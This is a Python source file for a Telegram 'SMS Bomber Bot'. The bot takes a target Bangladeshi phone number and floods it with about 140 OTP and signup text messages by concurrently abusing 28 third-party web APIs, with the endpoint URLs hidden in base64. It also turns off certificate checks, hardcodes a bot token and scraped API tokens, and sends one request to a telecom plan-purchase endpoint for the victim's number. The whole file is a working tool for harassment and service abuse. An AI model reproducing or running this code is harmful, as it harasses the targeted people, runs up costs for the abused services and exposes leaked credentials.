#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Telegram SMS Bomber Bot
Fast Mode - All APIs
"""

import asyncio
import aiohttp
import ssl
import base64
import random
import string
import os
import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
    ConversationHandler,
)

# ── Logging ──────────────────────────────────────────────────────────────────
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

# ── Config ────────────────────────────────────────────────────────────────────
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8787428715:AAGP9FBh0gX5q8TO-d5u_6Ghvj3Zs-LTR4w")

# Conversation states
WAITING_FOR_NUMBER = 1

# ── SSL ───────────────────────────────────────────────────────────────────────
_ssl = ssl.create_default_context()
_ssl.check_hostname = False
_ssl.verify_mode = ssl.CERT_NONE

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# ── Phone formatter ───────────────────────────────────────────────────────────
def format_phone(phone: str) -> dict:
    cleaned = ''.join(filter(str.isdigit, phone))
    if cleaned.startswith('880'):
        cleaned = cleaned[3:]
    elif cleaned.startswith('88'):
        cleaned = cleaned[2:]
    elif cleaned.startswith('0'):
        cleaned = cleaned[1:]
    if not cleaned.startswith('1') or len(cleaned) < 10:
        cleaned = cleaned.zfill(10)
    return {
        'original':      phone,
        'cleaned':       cleaned,
        'with_0':        f"0{cleaned}",
        'with_88':       f"88{cleaned}",
        'with_880':      f"880{cleaned}",
        'with_plus88':   f"+88{cleaned}",
        'with_plus880':  f"+880{cleaned}",
        'international': f"+88-{cleaned}",
    }


# ── Service Manager ───────────────────────────────────────────────────────────
class ServiceManager:
    def __init__(self, phone_data: dict):
        self.p = phone_data
        self.total = 0
        self.success = 0

    def _ua(self):
        return "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"

    async def _post_json(self, session, url, headers, payload):
        try:
            async with session.post(url, headers=headers, json=payload, ssl=_ssl, timeout=aiohttp.ClientTimeout(total=8)) as r:
                self.total += 1
                if r.status in (200, 201, 202):
                    self.success += 1
                    return True
        except Exception:
            self.total += 1
        return False

    async def _post_form(self, session, url, headers, data):
        try:
            async with session.post(url, headers=headers, data=data, ssl=_ssl, timeout=aiohttp.ClientTimeout(total=8)) as r:
                self.total += 1
                if r.status in (200, 201, 202):
                    self.success += 1
                    return True
        except Exception:
            self.total += 1
        return False

    async def _get(self, session, url, headers):
        try:
            async with session.get(url, headers=headers, ssl=_ssl, timeout=aiohttp.ClientTimeout(total=8)) as r:
                self.total += 1
                if r.status in (200, 201, 202):
                    self.success += 1
                    return True
        except Exception:
            self.total += 1
        return False

    # ── Individual API services ───────────────────────────────────────────────

    async def s1_btcl_mybtcl(self, session):
        """BTCL MyBTCL"""
        url = base64.b64decode(b'aHR0cHM6Ly9teWJ0Y2wuYnRjbC5nb3YuYmQvYXBpL2VjYXJlL2Fub255bS9zZW5kT1RQLmpzb24=').decode()
        h = {
            "accept": "application/json",
            "content-type": "application/json",
            "origin": "https://mybtcl.btcl.gov.bd",
            "referer": "https://mybtcl.btcl.gov.bd/register",
            "user-agent": self._ua(),
        }
        tasks = []
        for i in range(5):
            prefix = "+" * (i + 1)
            phone = f"{prefix}{self.p['with_0']}"
            payload = {"phoneNbr": phone, "email": "", "OTPType": 1, "userName": ""}
            tasks.append(self._post_json(session, url, h, payload))
        return await asyncio.gather(*tasks, return_exceptions=True)

    async def s2_btcl_phonebill(self, session):
        """BTCL PhoneBill"""
        url = base64.b64decode(b'aHR0cHM6Ly9waG9uZWJpbGwuYnRjbC5jb20uYmQvYXBpL2JjYXJlL2Fub255bS9zZW5kT1RQLmpzb24=').decode()
        h = {
            "accept": "application/json",
            "content-type": "application/json",
            "origin": "https://phonebill.btcl.com.bd",
            "referer": "https://phonebill.btcl.com.bd/registerBcare",
            "user-agent": self._ua(),
        }
        tasks = []
        for i in range(5):
            prefix = "+" * (i + 1)
            phone = f"{prefix}{self.p['with_0']}"
            payload = {"phoneNbr": phone, "email": "", "OTPType": 1, "userName": ""}
            tasks.append(self._post_json(session, url, h, payload))
        return await asyncio.gather(*tasks, return_exceptions=True)

    async def s3_bioscope(self, session):
        """Bioscope Plus"""
        url = base64.b64decode(b'aHR0cHM6Ly9hcGktZHluYW1pYy5iaW9zY29wZWxpdmUuY29tL3YyL2F1dGgvbG9naW4/Y291bnRyeT1CRCZwbGF0Zm9ybT13ZWImbGFuZ3VhZ2U9ZW4=').decode()
        h = {
            "accept": "application/json",
            "content-type": "application/json",
            "origin": "https://www.bioscopeplus.com",
            "referer": "https://www.bioscopeplus.com/",
            "user-agent": self._ua(),
        }
        tasks = []
        for i in range(5):
            prefix = "+" * (i + 1)
            phone = f"{prefix}88{self.p['cleaned']}"
            tasks.append(self._post_json(session, url, h, {"number": phone}))
        return await asyncio.gather(*tasks, return_exceptions=True)

    async def s4_btcl_bdia(self, session):
        """BTCL BDIA"""
        url = base64.b64decode(b'aHR0cHM6Ly9iZGlhLmJ0Y2wuY29tLmJkL2NsaWVudC9jbGllbnQvcmVnaXN0cmF0aW9uTW9iVmVyaWZpY2F0aW9uLTIuanNwP21vZHVsZUlEPTE=').decode()
        h = {
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://bdia.btcl.com.bd",
            "user-agent": self._ua(),
        }
        tasks = []
        for _ in range(5):
            tasks.append(self._post_form(session, url, h, {"actionType": "otpSend", "mobileNo": self.p['with_0']}))
        return await asyncio.gather(*tasks, return_exceptions=True)

    async def s5_bdtickets(self, session):
        """BD Tickets"""
        url = base64.b64decode(b'aHR0cHM6Ly9hcGkuYmR0aWNrZXRzLmNvbToyMDEwMC92MS9hdXRo').decode()
        h = {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "origin": "https://bdtickets.com",
            "referer": "https://bdtickets.com/",
            "user-agent": self._ua(),
        }
        phone = f"+88{self.p['cleaned']}"
        payload = {"createUserCheck": True, "phoneNumber": phone, "applicationChannel": "WEB_APP"}
        tasks = [self._post_json(session, url, h, payload) for _ in range(5)]
        return await asyncio.gather(*tasks, return_exceptions=True)

    async def s6_apex4u(self, session):
        """Apex4U"""
        url = base64.b64decode(b'aHR0cHM6Ly9hcGkuYXBleDR1LmNvbS9hcGkvYXV0aC9sb2dpbg==').decode()
        h = {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "origin": "https://apex4u.com",
            "referer": "https://apex4u.com/",
            "user-agent": self._ua(),
        }
        tasks = [self._post_json(session, url, h, {"phoneNumber": self.p['with_0']}) for _ in range(5)]
        return await asyncio.gather(*tasks, return_exceptions=True)

    async def s7_swap(self, session):
        """Swap.com.bd"""
        url = base64.b64decode(b'aHR0cHM6Ly9hcGkuc3dhcC5jb20uYmQvYXBpL3YxL3NlbmQtb3RwL3Yy').decode()
        h = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://swap.com.bd",
            "Referer": "https://swap.com.bd/",
            "signature": "JfhpbCI2A9NZt+WAfURnnns/34QgV05RT9vmQkUAcN0=",
            "user-agent": self._ua(),
        }
        tasks = [self._post_json(session, url, h, {"phone": self.p['with_0']}) for _ in range(5)]
        return await asyncio.gather(*tasks, return_exceptions=True)

    async def s8_ilyn(self, session):
        """Ilyn Global"""
        url = base64.b64decode(b'aHR0cHM6Ly9hcGkuaWx5bi5nbG9iYWwvYXV0aC9zaWdudXA=').decode()
        h = {
            'accept': 'application/json, text/plain, */*',
            'appcode': 'ilyn-bd',
            'origin': 'https://ilyn.global',
            'referer': 'https://ilyn.global/',
            'user-agent': self._ua(),
        }
        tasks = []
        for _ in range(5):
            data = aiohttp.FormData()
            data.add_field('phone', f'{{"code":"BD","number":"{self.p["with_plus880"]}\"}}')
            data.add_field('provider', 'sms')
            tasks.append(self._post_form(session, url, h, data))
        return await asyncio.gather(*tasks, return_exceptions=True)

    async def s9_arogga(self, session):
        """Arogga"""
        url = base64.b64decode(b'aHR0cHM6Ly9hcGkuYXJvZ2dhLmNvbS9hdXRoL3YxL3Ntcy9zZW5kLz9mPXdlYiZiPUNocm9tZSZ2PTE0MS4wLjAuMCZvcz1XaW5kb3dzJm9zdj0xMA==').decode()
        h = {
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.arogga.com',
            'referer': 'https://www.arogga.com/',
            'user-agent': self._ua(),
        }
        tasks = [self._post_form(session, url, h, {'mobile': self.p['with_0'], 'fcmToken': '', 'referral': ''}) for _ in range(5)]
        return await asyncio.gather(*tasks, return_exceptions=True)

    async def s10_fundesh(self, session):
        """Fundesh"""
        url = base64.b64decode(b'aHR0cHM6Ly9mdW5kZXNoLmNvbS5iZC9hcGkvYXV0aC9nZW5lcmF0ZU9UUD9zZXJ2aWNlX2tleT0=').decode()
        h = {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json; charset=UTF-8",
            "origin": "https://fundesh.com.bd",
            "user-agent": self._ua(),
        }
        tasks = [self._post_json(session, url, h, {"msisdn": self.p['with_0']}) for _ in range(5)]
        return await asyncio.gather(*tasks, return_exceptions=True)

    async def s11_garibook(self, session):
        """Garibook"""
        url = base64.b64decode(b'aHR0cHM6Ly9hcGkuZ2FyaWJvb2thZG1pbi5jb20vYXBpL3YzL3VzZXIvbG9naW4=').decode()
        h = {
            "accept": "application/json",
            "content-type": "application/json",
            "Origin": "https://garibook.com",
            "Referer": "https://garibook.com/",
            "user-agent": self._ua(),
        }
        payload = {"mobile": self.p['with_0'], "recaptcha_token": "garibookcaptcha", "channel": "web"}
        tasks = [self._post_json(session, url, h, payload) for _ in range(5)]
        return await asyncio.gather(*tasks, return_exceptions=True)

    async def s12_sheba(self, session):
        """Sheba"""
        url = base64.b64decode(b'aHR0cHM6Ly9hY2NvdW50a2l0LnNoZWJhLnh5ei9hcGkvc2hvb3Qtb3Rw').decode()
        h = {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json;charset=UTF-8",
            "custom-headers": '{"portal-name": "Customer Web"}',
            "origin": "https://www.sheba.xyz",
            "referer": "https://www.sheba.xyz/",
            "user-agent": self._ua(),
        }
        payload = {
            "mobile": self.p['with_plus88'],
            "app_id": "8329815A6D1AE6DD",
            "api_token": "zYGYWdR5BjNrdNJm9M1xto3MjbVyl8QVoJviGrubR90Bn4L7TnvJPScfzxnH",
        }
        tasks = [self._post_json(session, url, h, payload) for _ in range(5)]
        return await asyncio.gather(*tasks, return_exceptions=True)

    async def s13_applink(self, session):
        """AppLink"""
        url = base64.b64decode(b'aHR0cHM6Ly9hcHBzLmFwcGxpbmsuY29tLmJkL2FwcHN0b3JlLXY0LXNlcnZlci9sb2dpbi9vdHAvcmVxdWVzdA==').decode()
        h = {
            "Accept": "*/*",
            "Content-Type": "application/json",
            "Origin": "https://applink.com.bd",
            "Referer": "https://applink.com.bd/",
            "user-agent": self._ua(),
        }
        phone = f"88{self.p['cleaned']}"
        tasks = [self._post_json(session, url, h, {"msisdn": phone}) for _ in range(5)]
        return await asyncio.gather(*tasks, return_exceptions=True)

    async def s15_mygp_cinematic(self, session):
        """MyGP Cinematic"""
        phone = self.p['with_plus88']
        url = f"https://api.mygp.cinematic.mobi/api/v1/send-common-otp/wap/{phone}"
        h = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json;charset=UTF-8",
            "Origin": "https://cinematic.mobi",
            "Referer": "https://cinematic.mobi/",
            "user-agent": self._ua(),
        }
        payload = {"headers": {"Content-Type": "application/json", "Access-Control-Allow-Origin": "*",
                                "Authorization": "Bearer 1pake4mh5ln64h5t26kpvm3iri"}}
        tasks = [self._post_json(session, url, h, payload) for _ in range(5)]
        return await asyncio.gather(*tasks, return_exceptions=True)

    async def s16_gp_weblogin(self, session):
        """GP Web Login"""
        url = base64.b64decode(b'aHR0cHM6Ly93ZWJsb2dpbmRhLmdyYW1lZW5waG9uZS5jb20vYmFja2VuZC9hcGkvdjEvb3Rw').decode()
        h = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://www.grameenphone.com",
            "Referer": "https://www.grameenphone.com/",
            "user-agent": self._ua(),
        }
        tasks = [self._post_form(session, url, h, {"msisdn": self.p['with_0']}) for _ in range(5)]
        return await asyncio.gather(*tasks, return_exceptions=True)

    async def s17_ghoori(self, session):
        """Ghoori Learning"""
        url = base64.b64decode(b'aHR0cHM6Ly9hcGkuZ2hvb3JpbGVhcm5pbmcuY29tL2FwaS9hdXRoL3NpZ251cC9vdHA/X2FwcF9wbGF0Zm9ybT13ZWI=').decode()
        h = {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "origin": "https://ghoorilearning.com",
            "referer": "https://ghoorilearning.com/",
            "user-agent": self._ua(),
        }
        tasks = [self._post_json(session, url, h, {"mobile_no": self.p['with_0']}) for _ in range(5)]
        return await asyncio.gather(*tasks, return_exceptions=True)

    async def s18_deeptoplay(self, session):
        """Deepto Play"""
        url = base64.b64decode(b'aHR0cHM6Ly9hcGkuZGVlcHRvcGxheS5jb20vdjIvYXV0aC9sb2dpbj9jb3VudHJ5PUJEJnBsYXRmb3JtPXdlYiZsYW5ndWFnZT1lbg==').decode()
        h = {
            "accept": "application/json",
            "content-type": "application/json",
            "origin": "https://www.deeptoplay.com",
            "referer": "https://www.deeptoplay.com/",
            "user-agent": self._ua(),
        }
        tasks = [self._post_json(session, url, h, {"number": self.p['with_plus880']}) for _ in range(5)]
        return await asyncio.gather(*tasks, return_exceptions=True)

    async def s20_sailor(self, session):
        """Sailor Clothing"""
        url = base64.b64decode(b'aHR0cHM6Ly9iYWNrZW5kLnNhaWxvci5jbG90aGluZy9hcGkvdjIvYXV0aC9wYXNzd29yZC9mb3JnZXRfcmVxdWVzdA==').decode()
        h = {
            "accept": "application/json",
            "content-type": "application/json",
            "authorization": "Bearer 5637987|3QACHH6dNkj2VMvQ6iJIPm5Ww8ML3pENjBgoChTr",
            "origin": "https://sailor.clothing",
            "referer": "https://sailor.clothing/",
            "user-agent": self._ua(),
        }
        payload = {"email_or_phone": self.p['with_0'], "send_code_by": "phone"}
        tasks = [self._post_json(session, url, h, payload) for _ in range(5)]
        return await asyncio.gather(*tasks, return_exceptions=True)

    async def s22_medeasy(self, session):
        """MedEasy"""
        phone = self.p['with_plus88']
        url = f"https://api.medeasy.health/api/send-otp/{phone}/"
        h = {
            "accept": "application/json",
            "origin": "https://medeasy.health",
            "referer": "https://medeasy.health/",
            "user-agent": self._ua(),
        }
        tasks = [self._get(session, url, h) for _ in range(5)]
        return await asyncio.gather(*tasks, return_exceptions=True)

    async def s23_osudpotro(self, session):
        """Osudpotro"""
        url = base64.b64decode(b'aHR0cHM6Ly9hcGkub3N1ZHBvdHJvLmNvbS9hcGkvdjEvdXNlcnMvc2VuZF9vdHA=').decode()
        h = {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json;charset=UTF-8",
            "authorization": "Bearer undefined",
            "origin": "https://osudpotro.com",
            "referer": "https://osudpotro.com/",
            "user-agent": self._ua(),
        }
        phone = f"+88-{self.p['cleaned']}"
        payload = {"mobile": phone, "deviceToken": "web", "language": "en", "os": "web"}
        tasks = [self._post_json(session, url, h, payload) for _ in range(5)]
        return await asyncio.gather(*tasks, return_exceptions=True)

    async def s24_theclinicall(self, session):
        """TheClinicall"""
        url = base64.b64decode(b'aHR0cHM6Ly90aGVjbGluaWNhbGwuY29tL2JrYXBpL2F1dGgvdXNlci9vdHAvc2lnbmlu').decode()
        h = {
            "accept": "application/json",
            "content-type": "application/json",
            "authorization": "Bearer Hello",
            "origin": "https://www.theclinicall.com",
            "referer": "https://www.theclinicall.com/",
            "user-agent": self._ua(),
        }
        payload = {"countryCode": "BD", "dialCode": "880", "phone": self.p['cleaned']}
        tasks = [self._post_json(session, url, h, payload) for _ in range(5)]
        return await asyncio.gather(*tasks, return_exceptions=True)

    async def s26_carebox(self, session):
        """Care Box"""
        url = base64.b64decode(b'aHR0cHM6Ly93d3cuYXBpLWNhcmUtYm94LmNsaWNrL2FwaS91c2VyL3JlZ2lzdGVyLz92ZXJzaW9uPW90cA==').decode()
        h = {
            "accept": "*/*",
            "content-type": "application/json",
            "origin": "https://www.care-box.com",
            "referer": "https://www.care-box.com/",
            "user-agent": self._ua(),
        }
        names = ["Rakib Khan", "Md Hossain", "Sajib Ahmed", "Arif Hasan"]
        tasks = []
        for _ in range(5):
            payload = {"Name": random.choice(names), "Phone": self.p['with_plus880']}
            tasks.append(self._post_json(session, url, h, payload))
        return await asyncio.gather(*tasks, return_exceptions=True)

    async def s27_renixcare(self, session):
        """Renix Care"""
        url = base64.b64decode(b'aHR0cHM6Ly9yZW5peGFwaS5yZW5peGNhcmUuY29tL3Ntcy1hcGkvc2VuZC1vdHA=').decode()
        h = {
            "accept": "*/*",
            "content-type": "application/json",
            "origin": "https://renixcare.com",
            "referer": "https://renixcare.com/",
            "user-agent": self._ua(),
        }
        tasks = [self._post_json(session, url, h, {"phone": self.p['with_0']}) for _ in range(5)]
        return await asyncio.gather(*tasks, return_exceptions=True)

    async def s29_pkluck2_register(self, session):
        """PKLuck2 Register"""
        url = base64.b64decode(b'aHR0cHM6Ly93d3cucGtsdWNrMi5jb20vd3BzL3ZlcmlmaWNhdGlvbi9zbXMvcmVnaXN0ZXI=').decode()
        h = {
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
            'Device': 'web',
            'Language': 'BN',
            'Merchant': 'pklubdtf4',
            'Origin': 'https://www.pkluck2.com',
            'Referer': 'https://www.pkluck2.com/',
            'user-agent': self._ua(),
        }
        payload = {"countryDialingCode": "880", "mobileNo": self.p['with_0']}
        tasks = [self._post_json(session, url, h, payload) for _ in range(5)]
        return await asyncio.gather(*tasks, return_exceptions=True)

    async def s30_pkluck2_nologin(self, session):
        """PKLuck2 NoLogin"""
        url = base64.b64decode(b'aHR0cHM6Ly93d3cucGtsdWNrMi5jb20vd3BzL3ZlcmlmaWNhdGlvbi9zbXMvbm9Mb2dpbg==').decode()
        h = {
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
            'Device': 'web',
            'Language': 'BN',
            'Merchant': 'pklubdtf4',
            'Origin': 'https://www.pkluck2.com',
            'Referer': 'https://www.pkluck2.com/',
            'user-agent': self._ua(),
        }
        payload = {"mobileNum": self.p['with_0'], "countryDialingCode": "880"}
        tasks = [self._post_json(session, url, h, payload) for _ in range(5)]
        return await asyncio.gather(*tasks, return_exceptions=True)

    async def s31_gp_flexiplan(self, session):
        """GP Flexiplan"""
        url = base64.b64decode(b'aHR0cHM6Ly9ncHdlYm1zLmdyYW1lZW5waG9uZS5jb20vYXBpL3YxL2ZsZXhpcGxhbi1wdXJjaGFzZS9hY3RpdmF0aW9u').decode()
        h = {
            "Accept": "application/json, text/plain, */*",
            "Authorization": "Bearer null",
            "Content-Type": "application/json",
            "Origin": "https://www.grameenphone.com",
            "Referer": "https://www.grameenphone.com/",
            "user-agent": self._ua(),
        }
        payload = {
            "payment_mode": "mobile_balance", "longevity": 1, "voice": 100, "data": 0,
            "fourg": 0, "bioscope": 0, "sms": 0, "mca": 0, "price": 69,
            "msisdn": self.p['with_0'], "bundle_id": 60817, "is_login": False,
        }
        tasks = [self._post_json(session, url, h, payload) for _ in range(5)]
        return await asyncio.gather(*tasks, return_exceptions=True)

    async def s32_gp_fwa(self, session):
        """GP FWA"""
        url = base64.b64decode(b'aHR0cHM6Ly9ncGZpLWFwaS5ncmFtZWVucGhvbmUuY29tL2FwaS92MS9md2EvcmVxdWVzdC1mb3Itb3Rw').decode()
        h = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://gpfi.grameenphone.com",
            "Referer": "https://gpfi.grameenphone.com/",
            "user-agent": self._ua(),
        }
        payload = {"phone": self.p['with_0'], "email": "", "language": "en"}
        tasks = [self._post_json(session, url, h, payload) for _ in range(5)]
        return await asyncio.gather(*tasks, return_exceptions=True)

    async def s34_priyoshikkhaloy(self, session):
        """Priyoshikkhaloy"""
        url = base64.b64decode(b'aHR0cHM6Ly9hcHAucHJpeW9zaGlra2hhbG95LmNvbS9hcGkvdXNlci9yZWdpc3Rlci1sb2dpbi5waHA=').decode()
        h = {
            "User-Agent": "okhttp/4.11.0",
            "Accept-Encoding": "gzip",
            "Content-Type": "application/x-www-form-urlencoded",
        }
        tasks = [self._post_form(session, url, h, {"mobile": self.p['with_0']}) for _ in range(5)]
        return await asyncio.gather(*tasks, return_exceptions=True)

    # ── Run all fast ──────────────────────────────────────────────────────────
    async def run_fast(self):
        """Run all services concurrently — fast mode"""
        timeout = aiohttp.ClientTimeout(total=10, connect=5)
        connector = aiohttp.TCPConnector(limit=200, limit_per_host=50, ssl=_ssl, enable_cleanup_closed=True)

        async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
            all_services = [
                self.s1_btcl_mybtcl,
                self.s2_btcl_phonebill,
                self.s3_bioscope,
                self.s4_btcl_bdia,
                self.s5_bdtickets,
                self.s6_apex4u,
                self.s7_swap,
                self.s8_ilyn,
                self.s9_arogga,
                self.s10_fundesh,
                self.s11_garibook,
                self.s12_sheba,
                self.s13_applink,
                self.s15_mygp_cinematic,
                self.s16_gp_weblogin,
                self.s17_ghoori,
                self.s18_deeptoplay,
                self.s20_sailor,
                self.s22_medeasy,
                self.s23_osudpotro,
                self.s24_theclinicall,
                self.s26_carebox,
                self.s27_renixcare,
                self.s29_pkluck2_register,
                self.s30_pkluck2_nologin,
                self.s31_gp_flexiplan,
                self.s32_gp_fwa,
                self.s34_priyoshikkhaloy,
            ]
            tasks = [svc(session) for svc in all_services]
            await asyncio.gather(*tasks, return_exceptions=True)


# ── Telegram Handlers ─────────────────────────────────────────────────────────

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command — show main menu"""
    keyboard = [
        [InlineKeyboardButton("🚀 Start Attack", callback_data="start_attack")],
        [InlineKeyboardButton("📞 Support", callback_data="support")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(
        "🔥 *SMS Bomber Bot*\n\n"
        "⚡ Fast Mode — 28 APIs, 5 requests each\n"
        "📲 Total: ~140 SMS per run\n\n"
        "Choose an option:",
        parse_mode="Markdown",
        reply_markup=reply_markup,
    )


async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle inline button presses"""
    query = update.callback_query
    await query.answer()

    if query.data == "start_attack":
        await query.edit_message_text(
            "📱 *Enter Target Number:*\n"
            "_(Example: 017XXXXXXXX)_",
            parse_mode="Markdown",
        )
        return WAITING_FOR_NUMBER

    elif query.data == "support":
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_main")]]
        await query.edit_message_text(
            "☎️ *Support Center*\n\n"
            "👨‍💻 Admin: @parvesbrand420\n"
            "🛠️ Developer: @codex_haseb",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(keyboard),
        )

    elif query.data == "back_main":
        keyboard = [
            [InlineKeyboardButton("🚀 Start Attack", callback_data="start_attack")],
            [InlineKeyboardButton("📞 Support", callback_data="support")],
        ]
        await query.edit_message_text(
            "🔥 *SMS Bomber Bot*\n\n"
            "⚡ Fast Mode — 28 APIs, 5 requests each\n"
            "📲 Total: ~140 SMS per run\n\n"
            "Choose an option:",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(keyboard),
        )


async def receive_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Receive phone number and start bombing"""
    phone_raw = update.message.text.strip()

    # Basic validation
    digits = ''.join(filter(str.isdigit, phone_raw))
    if len(digits) < 10:
        await update.message.reply_text(
            "❌ *Invalid number!*\nPlease enter a valid BD number.\n_(Example: 017XXXXXXXX)_",
            parse_mode="Markdown",
        )
        return WAITING_FOR_NUMBER

    phone_data = format_phone(phone_raw)

    # Notify attack started
    await update.message.reply_text(
        f"🚀 *SMS Attack Started!*\n"
        f"📱 Target: `{phone_data['with_0']}`\n\n"
        f"⚡ Running 28 APIs concurrently...\n"
        f"🔥 Please wait...",
        parse_mode="Markdown",
    )

    # Run bombing
    manager = ServiceManager(phone_data)
    try:
        await manager.run_fast()
    except Exception as e:
        logger.error(f"Bombing error: {e}")

    # Show main menu again after finish
    keyboard = [
        [InlineKeyboardButton("🚀 Start Attack", callback_data="start_attack")],
        [InlineKeyboardButton("📞 Support", callback_data="support")],
    ]
    await update.message.reply_text(
        f"✅ *SMS Attack Finished!*\n"
        f"📱 Target: `{phone_data['with_0']}`\n\n"
        f"📊 Total Requests: `{manager.total}`\n"
        f"✔️ Successful: `{manager.success}`\n\n"
        f"Choose an option:",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(keyboard),
    )

    return ConversationHandler.END


async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Cancelled.")
    return ConversationHandler.END


# ── Main ──────────────────────────────────────────────────────────────────────

def main():
    token = BOT_TOKEN
    if token == "YOUR_BOT_TOKEN_HERE":
        raise ValueError("❌ Please set BOT_TOKEN environment variable!")

    app = Application.builder().token(token).build()

    conv_handler = ConversationHandler(
        entry_points=[CallbackQueryHandler(button_handler, pattern="^start_attack$")],
        states={
            WAITING_FOR_NUMBER: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_number)
            ],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
        per_message=False,
    )

    app.add_handler(CommandHandler("start", start))
    app.add_handler(conv_handler)
    app.add_handler(CallbackQueryHandler(button_handler))

    logger.info("🚀 Bot is running...")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()